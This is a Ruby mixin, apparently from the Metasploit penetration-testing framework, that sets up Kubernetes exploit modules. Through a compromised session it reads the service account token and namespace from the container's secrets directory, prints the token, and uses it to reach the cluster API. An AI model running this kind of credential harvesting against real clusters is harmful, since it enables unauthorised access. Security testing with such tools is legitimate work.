# -*- coding: binary -*-

# Base mixin for Kubernetes exploits,
module Msf::Exploit::Remote::HTTP::Kubernetes
  include Msf::PostMixin
  include Msf::Post::File

  def initialize(info = {})
    super

    register_options(
      [
        Msf::OptString.new('TOKEN', [false, 'Kubernetes API token']),
        Msf::OptString.new('NAMESPACE', [false, 'The Kubernetes namespace', 'default']),
      ]
    )
  end

  def connect_ws(opts = {}, *args)
    opts['comm'] = session
    opts['vhost'] = rhost
    super
  end

  def send_request_raw(opts = {}, *args)
    opts['comm'] = session
    opts['vhost'] = rhost
    super
  end

  def api_token
    @api_token || datastore['TOKEN']
  end

  def rhost
    @rhost || datastore['RHOST']
  end

  def rport
    @rport || datastore['RPORT']
  end

  def namespace
    @namespace || datastore['NAMESPACE']
  end

  def configure_via_session
    vprint_status("Configuring options via session #{session.sid}")

    unless directory?('/run/secrets/kubernetes.io')
      # This would imply that the target is not a Kubernetes container
      fail_with(Msf::Module::Failure::NotFound, 'The kubernetes.io directory was not found')
    end

    if api_token.blank?
      token = read_file('/run/secrets/kubernetes.io/serviceaccount/token')
      fail_with(Msf::Module::Failure::NotFound, 'The API token was not found, manually set the TOKEN option') if token.blank?

      print_good("API Token: #{token}")
      @api_token = token
    end

    if namespace.blank?
      ns = read_file('/run/secrets/kubernetes.io/serviceaccount/namespace')
      fail_with(Msf::Module::Failure::NotFound, 'The namespace was not found, manually set the NAMESPACE option') if ns.blank?

      print_good("Namespace: #{ns}")
      @namespace = ns
    end

    service_host = service_port = nil
    if rhost.blank?
      service_host = get_env('KUBERNETES_SERVICE_HOST')
      fail_with(Msf::Module::Failure::NotFound, 'The KUBERNETES_SERVICE_HOST environment variable was not found, manually set the RHOSTS option') if service_host.blank?

      @rhost = service_host
    end

    if rport.blank?
      service_port = get_env('KUBERNETES_SERVICE_PORT_HTTPS')
      fail_with(Msf::Module::Failure::NotFound, 'The KUBERNETES_SERVICE_PORT_HTTPS environment variable was not found, manually set the RPORT option') if service_port.blank?

      @rport = service_port.to_i
    end

    if service_host || service_port
      service = "#{Rex::Socket.is_ipv6?(service_host) ? '[' + service_host + ']' : service_host}:#{service_port}"
      print_good("Kubernetes service host: #{service}")
    end
  end

  def validate_configuration!
    fail_with(Msf::Module::Failure::BadConfig, 'Missing option: RHOSTS') if rhost.blank?
    fail_with(Msf::Module::Failure::BadConfig, 'Missing option: RPORT') if rport.blank?
    fail_with(Msf::Module::Failure::BadConfig, 'Invalid option: RPORT') unless rport.to_i > 0 && rport.to_i < 65536
    fail_with(Msf::Module::Failure::BadConfig, 'Missing option: TOKEN') if api_token.blank?
    fail_with(Msf::Module::Failure::BadConfig, 'Missing option: NAMESPACE') if namespace.blank?
  end
end
